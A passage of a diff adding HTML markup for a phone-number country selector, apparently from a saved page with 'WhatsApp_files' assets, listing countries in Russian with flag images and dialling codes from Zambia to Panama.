+                                </div>
+                                <p class="name">Замбия</p>
+                                <p class="code">+260</p>
+                            </div>
+                                                    <div class="item" data-code="+263" data-lang="ZW" data-name="Зимбабве">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ZW.png" alt="ZW" data-ll-status="loaded" src="./WhatsApp_files/ZW.png">
+                                </div>
+                                <p class="name">Зимбабве</p>
+                                <p class="code">+263</p>
+                            </div>
+                                                    <div class="item" data-code="+972" data-lang="IL" data-name="Израиль">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IL.png" alt="IL" data-ll-status="loaded" src="./WhatsApp_files/IL.png">
+                                </div>
+                                <p class="name">Израиль</p>
+                                <p class="code">+972</p>
+                            </div>
+                                                    <div class="item" data-code="+91" data-lang="IN" data-name="Индия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IN.png" alt="IN" data-ll-status="loaded" src="./WhatsApp_files/IN.png">
+                                </div>
+                                <p class="name">Индия</p>
+                                <p class="code">+91</p>
+                            </div>
+                                                    <div class="item" data-code="+62" data-lang="ID" data-name="Индонезия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ID.png" alt="ID" data-ll-status="loaded" src="./WhatsApp_files/ID.png">
+                                </div>
+                                <p class="name">Индонезия</p>
+                                <p class="code">+62</p>
+                            </div>
+                                                    <div class="item" data-code="+962" data-lang="JO" data-name="Иордания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/JO.png" alt="JO" data-ll-status="loaded" src="./WhatsApp_files/JO.png">
+                                </div>
+                                <p class="name">Иордания</p>
+                                <p class="code">+962</p>
+                            </div>
+                                                    <div class="item" data-code="+964" data-lang="IQ" data-name="Ирак">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IQ.png" alt="IQ" data-ll-status="loaded" src="./WhatsApp_files/IQ.png">
+                                </div>
+                                <p class="name">Ирак</p>
+                                <p class="code">+964</p>
+                            </div>
+                                                    <div class="item" data-code="+98" data-lang="IR" data-name="Иран">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IR.png" alt="IR" data-ll-status="loaded" src="./WhatsApp_files/IR.png">
+                                </div>
+                                <p class="name">Иран</p>
+                                <p class="code">+98</p>
+                            </div>
+                                                    <div class="item" data-code="+353" data-lang="IE" data-name="Ирландия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IE.png" alt="IE" data-ll-status="loaded" src="./WhatsApp_files/IE.png">
+                                </div>
+                                <p class="name">Ирландия</p>
+                                <p class="code">+353</p>
+                            </div>
+                                                    <div class="item" data-code="+354" data-lang="IS" data-name="Исландия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IS.png" alt="IS" data-ll-status="loaded" src="./WhatsApp_files/IS.png">
+                                </div>
+                                <p class="name">Исландия</p>
+                                <p class="code">+354</p>
+                            </div>
+                                                    <div class="item" data-code="+34" data-lang="ES" data-name="Испания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ES.png" alt="ES" data-ll-status="loaded" src="./WhatsApp_files/ES.png">
+                                </div>
+                                <p class="name">Испания</p>
+                                <p class="code">+34</p>
+                            </div>
+                                                    <div class="item" data-code="+39" data-lang="IT" data-name="Италия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IT.png" alt="IT" data-ll-status="loaded" src="./WhatsApp_files/IT.png">
+                                </div>
+                                <p class="name">Италия</p>
+                                <p class="code">+39</p>
+                            </div>
+                                                    <div class="item" data-code="+967" data-lang="YE" data-name="Йемен">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/YE.png" alt="YE" data-ll-status="loaded" src="./WhatsApp_files/YE.png">
+                                </div>
+                                <p class="name">Йемен</p>
+                                <p class="code">+967</p>
+                            </div>
+                                                    <div class="item" data-code="+238" data-lang="CV" data-name="Кабо-Верде">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CV.png" alt="CV" data-ll-status="loaded" src="./WhatsApp_files/CV.png">
+                                </div>
+                                <p class="name">Кабо-Верде</p>
+                                <p class="code">+238</p>
+                            </div>
+                                                    <div class="item" data-code="+7" data-lang="KZ" data-name="Казахстан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KZ.png" alt="KZ" data-ll-status="loaded" src="./WhatsApp_files/KZ.png">
+                                </div>
+                                <p class="name">Казахстан</p>
+                                <p class="code">+7</p>
+                            </div>
+                                                    <div class="item" data-code="+855" data-lang="KH" data-name="Камбоджа">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KH.png" alt="KH" data-ll-status="loaded" src="./WhatsApp_files/KH.png">
+                                </div>
+                                <p class="name">Камбоджа</p>
+                                <p class="code">+855</p>
+                            </div>
+                                                    <div class="item" data-code="+237" data-lang="CM" data-name="Камерун">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CM.png" alt="CM" data-ll-status="loaded" src="./WhatsApp_files/CM.png">
+                                </div>
+                                <p class="name">Камерун</p>
+                                <p class="code">+237</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="CA" data-name="Канада">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CA.png" alt="CA" data-ll-status="loaded" src="./WhatsApp_files/CA.png">
+                                </div>
+                                <p class="name">Канада</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+974" data-lang="QA" data-name="Катар">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/QA.png" alt="QA" data-ll-status="loaded" src="./WhatsApp_files/QA.png">
+                                </div>
+                                <p class="name">Катар</p>
+                                <p class="code">+974</p>
+                            </div>
+                                                    <div class="item" data-code="+254" data-lang="KE" data-name="Кения">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KE.png" alt="KE" data-ll-status="loaded" src="./WhatsApp_files/KE.png">
+                                </div>
+                                <p class="name">Кения</p>
+                                <p class="code">+254</p>
+                            </div>
+                                                    <div class="item" data-code="+357" data-lang="CY" data-name="Кипр">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CY.png" alt="CY" data-ll-status="loaded" src="./WhatsApp_files/CY.png">
+                                </div>
+                                <p class="name">Кипр</p>
+                                <p class="code">+357</p>
+                            </div>
+                                                    <div class="item" data-code="+996" data-lang="KG" data-name="Киргизия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KG.png" alt="KG" data-ll-status="loaded" src="./WhatsApp_files/KG.png">
+                                </div>
+                                <p class="name">Киргизия</p>
+                                <p class="code">+996</p>
+                            </div>
+                                                    <div class="item" data-code="+686" data-lang="KI" data-name="Кирибати">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KI.png" alt="KI" data-ll-status="loaded" src="./WhatsApp_files/KI.png">
+                                </div>
+                                <p class="name">Кирибати</p>
+                                <p class="code">+686</p>
+                            </div>
+                                                    <div class="item" data-code="+86" data-lang="CN" data-name="Китай">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CN.png" alt="CN" data-ll-status="loaded" src="./WhatsApp_files/CN.png">
+                                </div>
+                                <p class="name">Китай</p>
+                                <p class="code">+86</p>
+                            </div>
+                                                    <div class="item" data-code="+850" data-lang="KP" data-name="КНДР">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KP.png" alt="KP" data-ll-status="loaded" src="./WhatsApp_files/KP.png">
+                                </div>
+                                <p class="name">КНДР</p>
+                                <p class="code">+850</p>
+                            </div>
+                                                    <div class="item" data-code="+61" data-lang="CC" data-name="Кокосовые о-ва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CC.png" alt="CC" data-ll-status="loaded" src="./WhatsApp_files/CC.png">
+                                </div>
+                                <p class="name">Кокосовые о-ва</p>
+                                <p class="code">+61</p>
+                            </div>
+                                                    <div class="item" data-code="+57" data-lang="CO" data-name="Колумбия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CO.png" alt="CO" data-ll-status="loaded" src="./WhatsApp_files/CO.png">
+                                </div>
+                                <p class="name">Колумбия</p>
+                                <p class="code">+57</p>
+                            </div>
+                                                    <div class="item" data-code="+269" data-lang="KM" data-name="Коморы">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KM.png" alt="KM" data-ll-status="loaded" src="./WhatsApp_files/KM.png">
+                                </div>
+                                <p class="name">Коморы</p>
+                                <p class="code">+269</p>
+                            </div>
+                                                    <div class="item" data-code="+242" data-lang="CG" data-name="Конго - Браззавиль">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CG.png" alt="CG" data-ll-status="loaded" src="./WhatsApp_files/CG.png">
+                                </div>
+                                <p class="name">Конго - Браззавиль</p>
+                                <p class="code">+242</p>
+                            </div>
+                                                    <div class="item" data-code="+243" data-lang="CD" data-name="Конго - Киншаса">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CD.png" alt="CD" data-ll-status="loaded" src="./WhatsApp_files/CD.png">
+                                </div>
+                                <p class="name">Конго - Киншаса</p>
+                                <p class="code">+243</p>
+                            </div>
+                                                    <div class="item" data-code="+383" data-lang="XK" data-name="Косово">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/XK.png" alt="XK" data-ll-status="loaded" src="./WhatsApp_files/XK.png">
+                                </div>
+                                <p class="name">Косово</p>
+                                <p class="code">+383</p>
+                            </div>
+                                                    <div class="item" data-code="+506" data-lang="CR" data-name="Коста-Рика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CR.png" alt="CR" data-ll-status="loaded" src="./WhatsApp_files/CR.png">
+                                </div>
+                                <p class="name">Коста-Рика</p>
+                                <p class="code">+506</p>
+                            </div>
+                                                    <div class="item" data-code="+225" data-lang="CI" data-name="Кот-д’Ивуар">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CI.png" alt="CI" data-ll-status="loaded" src="./WhatsApp_files/CI.png">
+                                </div>
+                                <p class="name">Кот-д’Ивуар</p>
+                                <p class="code">+225</p>
+                            </div>
+                                                    <div class="item" data-code="+53" data-lang="CU" data-name="Куба">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CU.png" alt="CU" data-ll-status="loaded" src="./WhatsApp_files/CU.png">
+                                </div>
+                                <p class="name">Куба</p>
+                                <p class="code">+53</p>
+                            </div>
+                                                    <div class="item" data-code="+965" data-lang="KW" data-name="Кувейт">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KW.png" alt="KW" data-ll-status="loaded" src="./WhatsApp_files/KW.png">
+                                </div>
+                                <p class="name">Кувейт</p>
+                                <p class="code">+965</p>
+                            </div>
+                                                    <div class="item" data-code="+599" data-lang="CW" data-name="Кюрасао">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CW.png" alt="CW" data-ll-status="loaded" src="./WhatsApp_files/CW.png">
+                                </div>
+                                <p class="name">Кюрасао</p>
+                                <p class="code">+599</p>
+                            </div>
+                                                    <div class="item" data-code="+856" data-lang="LA" data-name="Лаос">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LA.png" alt="LA" data-ll-status="loaded" src="./WhatsApp_files/LA.png">
+                                </div>
+                                <p class="name">Лаос</p>
+                                <p class="code">+856</p>
+                            </div>
+                                                    <div class="item" data-code="+371" data-lang="LV" data-name="Латвия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LV.png" alt="LV" data-ll-status="loaded" src="./WhatsApp_files/LV.png">
+                                </div>
+                                <p class="name">Латвия</p>
+                                <p class="code">+371</p>
+                            </div>
+                                                    <div class="item" data-code="+266" data-lang="LS" data-name="Лесото">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LS.png" alt="LS" data-ll-status="loaded" src="./WhatsApp_files/LS.png">
+                                </div>
+                                <p class="name">Лесото</p>
+                                <p class="code">+266</p>
+                            </div>
+                                                    <div class="item" data-code="+231" data-lang="LR" data-name="Либерия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LR.png" alt="LR" data-ll-status="loaded" src="./WhatsApp_files/LR.png">
+                                </div>
+                                <p class="name">Либерия</p>
+                                <p class="code">+231</p>
+                            </div>
+                                                    <div class="item" data-code="+961" data-lang="LB" data-name="Ливан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LB.png" alt="LB" data-ll-status="loaded" src="./WhatsApp_files/LB.png">
+                                </div>
+                                <p class="name">Ливан</p>
+                                <p class="code">+961</p>
+                            </div>
+                                                    <div class="item" data-code="+218" data-lang="LY" data-name="Ливия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LY.png" alt="LY" data-ll-status="loaded" src="./WhatsApp_files/LY.png">
+                                </div>
+                                <p class="name">Ливия</p>
+                                <p class="code">+218</p>
+                            </div>
+                                                    <div class="item" data-code="+370" data-lang="LT" data-name="Литва">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LT.png" alt="LT" data-ll-status="loaded" src="./WhatsApp_files/LT.png">
+                                </div>
+                                <p class="name">Литва</p>
+                                <p class="code">+370</p>
+                            </div>
+                                                    <div class="item" data-code="+423" data-lang="LI" data-name="Лихтенштейн">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LI.png" alt="LI" data-ll-status="loaded" src="./WhatsApp_files/LI.png">
+                                </div>
+                                <p class="name">Лихтенштейн</p>
+                                <p class="code">+423</p>
+                            </div>
+                                                    <div class="item" data-code="+352" data-lang="LU" data-name="Люксембург">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/LU.png" alt="LU" data-ll-status="loaded" src="./WhatsApp_files/LU.png">
+                                </div>
+                                <p class="name">Люксембург</p>
+                                <p class="code">+352</p>
+                            </div>
+                                                    <div class="item" data-code="+230" data-lang="MU" data-name="Маврикий">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MU.png" alt="MU" data-ll-status="loaded" src="./WhatsApp_files/MU.png">
+                                </div>
+                                <p class="name">Маврикий</p>
+                                <p class="code">+230</p>
+                            </div>
+                                                    <div class="item" data-code="+222" data-lang="MR" data-name="Мавритания">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MR.png" alt="MR" data-ll-status="loaded" src="./WhatsApp_files/MR.png">
+                                </div>
+                                <p class="name">Мавритания</p>
+                                <p class="code">+222</p>
+                            </div>
+                                                    <div class="item" data-code="+261" data-lang="MG" data-name="Мадагаскар">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MG.png" alt="MG" data-ll-status="loaded" src="./WhatsApp_files/MG.png">
+                                </div>
+                                <p class="name">Мадагаскар</p>
+                                <p class="code">+261</p>
+                            </div>
+                                                    <div class="item" data-code="+262" data-lang="YT" data-name="Майотта">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/YT.png" alt="YT" data-ll-status="loaded" src="./WhatsApp_files/YT.png">
+                                </div>
+                                <p class="name">Майотта</p>
+                                <p class="code">+262</p>
+                            </div>
+                                                    <div class="item" data-code="+853" data-lang="MO" data-name="Макао (САР)">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MO.png" alt="MO" data-ll-status="loaded" src="./WhatsApp_files/MO.png">
+                                </div>
+                                <p class="name">Макао (САР)</p>
+                                <p class="code">+853</p>
+                            </div>
+                                                    <div class="item" data-code="+265" data-lang="MW" data-name="Малави">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MW.png" alt="MW" data-ll-status="loaded" src="./WhatsApp_files/MW.png">
+                                </div>
+                                <p class="name">Малави</p>
+                                <p class="code">+265</p>
+                            </div>
+                                                    <div class="item" data-code="+60" data-lang="MY" data-name="Малайзия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MY.png" alt="MY" data-ll-status="loaded" src="./WhatsApp_files/MY.png">
+                                </div>
+                                <p class="name">Малайзия</p>
+                                <p class="code">+60</p>
+                            </div>
+                                                    <div class="item" data-code="+223" data-lang="ML" data-name="Мали">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/ML.png" alt="ML" data-ll-status="loaded" src="./WhatsApp_files/ML.png">
+                                </div>
+                                <p class="name">Мали</p>
+                                <p class="code">+223</p>
+                            </div>
+                                                    <div class="item" data-code="+960" data-lang="MV" data-name="Мальдивы">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MV.png" alt="MV" data-ll-status="loaded" src="./WhatsApp_files/MV.png">
+                                </div>
+                                <p class="name">Мальдивы</p>
+                                <p class="code">+960</p>
+                            </div>
+                                                    <div class="item" data-code="+356" data-lang="MT" data-name="Мальта">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MT.png" alt="MT" data-ll-status="loaded" src="./WhatsApp_files/MT.png">
+                                </div>
+                                <p class="name">Мальта</p>
+                                <p class="code">+356</p>
+                            </div>
+                                                    <div class="item" data-code="+212" data-lang="MA" data-name="Марокко">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MA.png" alt="MA" data-ll-status="loaded" src="./WhatsApp_files/MA.png">
+                                </div>
+                                <p class="name">Марокко</p>
+                                <p class="code">+212</p>
+                            </div>
+                                                    <div class="item" data-code="+596" data-lang="MQ" data-name="Мартиника">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MQ.png" alt="MQ" data-ll-status="loaded" src="./WhatsApp_files/MQ.png">
+                                </div>
+                                <p class="name">Мартиника</p>
+                                <p class="code">+596</p>
+                            </div>
+                                                    <div class="item" data-code="+692" data-lang="MH" data-name="Маршалловы Острова">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MH.png" alt="MH" data-ll-status="loaded" src="./WhatsApp_files/MH.png">
+                                </div>
+                                <p class="name">Маршалловы Острова</p>
+                                <p class="code">+692</p>
+                            </div>
+                                                    <div class="item" data-code="+52" data-lang="MX" data-name="Мексика">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MX.png" alt="MX" data-ll-status="loaded" src="./WhatsApp_files/MX.png">
+                                </div>
+                                <p class="name">Мексика</p>
+                                <p class="code">+52</p>
+                            </div>
+                                                    <div class="item" data-code="+258" data-lang="MZ" data-name="Мозамбик">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MZ.png" alt="MZ" data-ll-status="loaded" src="./WhatsApp_files/MZ.png">
+                                </div>
+                                <p class="name">Мозамбик</p>
+                                <p class="code">+258</p>
+                            </div>
+                                                    <div class="item" data-code="+373" data-lang="MD" data-name="Молдова">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MD.png" alt="MD" data-ll-status="loaded" src="./WhatsApp_files/MD.png">
+                                </div>
+                                <p class="name">Молдова</p>
+                                <p class="code">+373</p>
+                            </div>
+                                                    <div class="item" data-code="+377" data-lang="MC" data-name="Монако">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MC.png" alt="MC" data-ll-status="loaded" src="./WhatsApp_files/MC.png">
+                                </div>
+                                <p class="name">Монако</p>
+                                <p class="code">+377</p>
+                            </div>
+                                                    <div class="item" data-code="+976" data-lang="MN" data-name="Монголия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MN.png" alt="MN" data-ll-status="loaded" src="./WhatsApp_files/MN.png">
+                                </div>
+                                <p class="name">Монголия</p>
+                                <p class="code">+976</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="MS" data-name="Монтсеррат">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MS.png" alt="MS" data-ll-status="loaded" src="./WhatsApp_files/MS.png">
+                                </div>
+                                <p class="name">Монтсеррат</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+95" data-lang="MM" data-name="Мьянма (Бирма)">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/MM.png" alt="MM" data-ll-status="loaded" src="./WhatsApp_files/MM.png">
+                                </div>
+                                <p class="name">Мьянма (Бирма)</p>
+                                <p class="code">+95</p>
+                            </div>
+                                                    <div class="item" data-code="+264" data-lang="NA" data-name="Намибия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NA.png" alt="NA" data-ll-status="loaded" src="./WhatsApp_files/NA.png">
+                                </div>
+                                <p class="name">Намибия</p>
+                                <p class="code">+264</p>
+                            </div>
+                                                    <div class="item" data-code="+674" data-lang="NR" data-name="Науру">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NR.png" alt="NR" data-ll-status="loaded" src="./WhatsApp_files/NR.png">
+                                </div>
+                                <p class="name">Науру</p>
+                                <p class="code">+674</p>
+                            </div>
+                                                    <div class="item" data-code="+977" data-lang="NP" data-name="Непал">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NP.png" alt="NP" data-ll-status="loaded" src="./WhatsApp_files/NP.png">
+                                </div>
+                                <p class="name">Непал</p>
+                                <p class="code">+977</p>
+                            </div>
+                                                    <div class="item" data-code="+227" data-lang="NE" data-name="Нигер">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NE.png" alt="NE" data-ll-status="loaded" src="./WhatsApp_files/NE.png">
+                                </div>
+                                <p class="name">Нигер</p>
+                                <p class="code">+227</p>
+                            </div>
+                                                    <div class="item" data-code="+234" data-lang="NG" data-name="Нигерия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NG.png" alt="NG" data-ll-status="loaded" src="./WhatsApp_files/NG.png">
+                                </div>
+                                <p class="name">Нигерия</p>
+                                <p class="code">+234</p>
+                            </div>
+                                                    <div class="item" data-code="+31" data-lang="NL" data-name="Нидерланды">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NL.png" alt="NL" data-ll-status="loaded" src="./WhatsApp_files/NL.png">
+                                </div>
+                                <p class="name">Нидерланды</p>
+                                <p class="code">+31</p>
+                            </div>
+                                                    <div class="item" data-code="+505" data-lang="NI" data-name="Никарагуа">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NI.png" alt="NI" data-ll-status="loaded" src="./WhatsApp_files/NI.png">
+                                </div>
+                                <p class="name">Никарагуа</p>
+                                <p class="code">+505</p>
+                            </div>
+                                                    <div class="item" data-code="+683" data-lang="NU" data-name="Ниуэ">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NU.png" alt="NU" data-ll-status="loaded" src="./WhatsApp_files/NU.png">
+                                </div>
+                                <p class="name">Ниуэ</p>
+                                <p class="code">+683</p>
+                            </div>
+                                                    <div class="item" data-code="+64" data-lang="NZ" data-name="Новая Зеландия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NZ.png" alt="NZ" data-ll-status="loaded" src="./WhatsApp_files/NZ.png">
+                                </div>
+                                <p class="name">Новая Зеландия</p>
+                                <p class="code">+64</p>
+                            </div>
+                                                    <div class="item" data-code="+687" data-lang="NC" data-name="Новая Каледония">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NC.png" alt="NC" data-ll-status="loaded" src="./WhatsApp_files/NC.png">
+                                </div>
+                                <p class="name">Новая Каледония</p>
+                                <p class="code">+687</p>
+                            </div>
+                                                    <div class="item" data-code="+47" data-lang="NO" data-name="Норвегия">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NO.png" alt="NO" data-ll-status="loaded" src="./WhatsApp_files/NO.png">
+                                </div>
+                                <p class="name">Норвегия</p>
+                                <p class="code">+47</p>
+                            </div>
+                                                    <div class="item" data-code="+247" data-lang="AC" data-name="о-в Вознесения">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AC.png" alt="AC" data-ll-status="loaded" src="./WhatsApp_files/AC.png">
+                                </div>
+                                <p class="name">о-в Вознесения</p>
+                                <p class="code">+247</p>
+                            </div>
+                                                    <div class="item" data-code="+44" data-lang="IM" data-name="о-в Мэн">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/IM.png" alt="IM" data-ll-status="loaded" src="./WhatsApp_files/IM.png">
+                                </div>
+                                <p class="name">о-в Мэн</p>
+                                <p class="code">+44</p>
+                            </div>
+                                                    <div class="item" data-code="+672" data-lang="NF" data-name="о-в Норфолк">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/NF.png" alt="NF" data-ll-status="loaded" src="./WhatsApp_files/NF.png">
+                                </div>
+                                <p class="name">о-в Норфолк</p>
+                                <p class="code">+672</p>
+                            </div>
+                                                    <div class="item" data-code="+61" data-lang="CX" data-name="о-в Рождества">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CX.png" alt="CX" data-ll-status="loaded" src="./WhatsApp_files/CX.png">
+                                </div>
+                                <p class="name">о-в Рождества</p>
+                                <p class="code">+61</p>
+                            </div>
+                                                    <div class="item" data-code="+290" data-lang="SH" data-name="о-в Св. Елены">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/SH.png" alt="SH" data-ll-status="loaded" src="./WhatsApp_files/SH.png">
+                                </div>
+                                <p class="name">о-в Св. Елены</p>
+                                <p class="code">+290</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="TC" data-name="о-ва Тёркс и Кайкос">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/TC.png" alt="TC" data-ll-status="loaded" src="./WhatsApp_files/TC.png">
+                                </div>
+                                <p class="name">о-ва Тёркс и Кайкос</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+971" data-lang="AE" data-name="ОАЭ">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/AE.png" alt="AE" data-ll-status="loaded" src="./WhatsApp_files/AE.png">
+                                </div>
+                                <p class="name">ОАЭ</p>
+                                <p class="code">+971</p>
+                            </div>
+                                                    <div class="item" data-code="+968" data-lang="OM" data-name="Оман">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/OM.png" alt="OM" data-ll-status="loaded" src="./WhatsApp_files/OM.png">
+                                </div>
+                                <p class="name">Оман</p>
+                                <p class="code">+968</p>
+                            </div>
+                                                    <div class="item" data-code="+1" data-lang="KY" data-name="Острова Кайман">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/KY.png" alt="KY" data-ll-status="loaded" src="./WhatsApp_files/KY.png">
+                                </div>
+                                <p class="name">Острова Кайман</p>
+                                <p class="code">+1</p>
+                            </div>
+                                                    <div class="item" data-code="+682" data-lang="CK" data-name="Острова Кука">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/CK.png" alt="CK" data-ll-status="loaded" src="./WhatsApp_files/CK.png">
+                                </div>
+                                <p class="name">Острова Кука</p>
+                                <p class="code">+682</p>
+                            </div>
+                                                    <div class="item" data-code="+92" data-lang="PK" data-name="Пакистан">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PK.png" alt="PK" data-ll-status="loaded" src="./WhatsApp_files/PK.png">
+                                </div>
+                                <p class="name">Пакистан</p>
+                                <p class="code">+92</p>
+                            </div>
+                                                    <div class="item" data-code="+680" data-lang="PW" data-name="Палау">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PW.png" alt="PW" data-ll-status="loaded" src="./WhatsApp_files/PW.png">
+                                </div>
+                                <p class="name">Палау</p>
+                                <p class="code">+680</p>
+                            </div>
+                                                    <div class="item" data-code="+970" data-lang="PS" data-name="Палестинские территории">
+                                <div class="image">
+                                    <img class="lazy entered loaded" data-src="/assets/template/number/img/flags/PS.png" alt="PS" data-ll-status="loaded" src="./WhatsApp_files/PS.png">
+                                </div>
+                                <p class="name">Палестинские территории</p>
+                                <p class="code">+970</p>
+                            </div>
+                                                    <div class="item" data-code="+507" data-lang="PA" data-name="Панама">
+                                <div class="image">
